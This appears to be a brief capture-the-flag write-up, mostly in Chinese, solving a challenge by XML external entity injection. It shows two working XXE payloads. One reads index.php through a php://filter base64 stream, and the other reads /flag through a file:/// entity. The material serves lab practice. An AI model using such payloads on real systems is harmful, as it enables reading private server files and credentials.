# File Access
```
file://index.php
```

# XXE

讀取index.php檔案，發現 flag 不在裡面=3=
```
<!DOCTYPE root [
  <!ENTITY name SYSTEM
  "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"
  >
]>
<root>
    <result>&name;</result>
</root>
```
   
然後重讀題目發現....我眼殘 flag 在 /flag

```
<!DOCTYPE root [
  <!ENTITY name SYSTEM "file:///flag">
]>
<root>&name;</root>
```

#
